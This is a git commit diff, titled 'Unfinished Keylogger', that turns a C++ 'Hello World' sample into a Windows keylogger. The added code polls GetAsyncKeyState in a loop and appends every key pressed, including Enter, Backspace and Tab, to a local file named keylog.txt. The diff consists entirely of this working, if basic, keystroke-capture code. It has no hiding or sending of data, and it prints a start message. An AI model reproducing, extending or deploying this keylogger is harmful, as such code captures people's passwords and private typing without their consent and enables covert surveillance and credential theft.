f99ac84f9f5cff0a86fe6b9ddb99fe2400fbefb7
John Emmanuel Sales <salesjohnemmanuel@gmail.com>
2025-05-04 23:57:04 +0800

    Unfinished Keylogger

--- keylogger/keylogger.cpp
+++ keylogger/keylogger.cpp
@@ -1,16 +1,36 @@
 #include <iostream>
-#include <vector>
-#include <string>
+#include <fstream>
+#include <windows.h>
 
 using namespace std;
 
-int main()
-{
-    vector<string> msg {"Hello", "C++", "World", "from", "VS Code", "and the C++ extension!"};
+void logKey(int key){
+    ofstream logFile("keylog.txt", ios::app);
 
-    for (const string& word : msg)
-    {
-        cout << word << " ";
+    if (key == VK_BACK) logFile << "[BACKSPACE]";
+    else if (key == VK_RETURN) logFile << "[ENTER]\n";
+    else if (key == VK_SPACE) logFile << " ";
+    else if (key == VK_TAB) logFile << "[TAB]";
+    else if (key == VK_SHIFT) logFile << "[SHIFT]";
+    else if (key == VK_ESCAPE) logFile << "[ESC]";
+    else if (key >= 32 && key <= 126) logFile << char(key);
+
+    logFile.close();
+}
+
+
+int main(){
+    cout << "Keylogger started. Logging to keylog.txt..." << endl;
+
+    while(true) {
+        Sleep(10);
+
+        for(int key = 8; key <= 190; key++){
+            if(GetAsyncKeyState(key) & 0x0001) {
+                logKey(key);
+            }
+        }
     }
-    cout << endl;
+
+    return 0;
 }
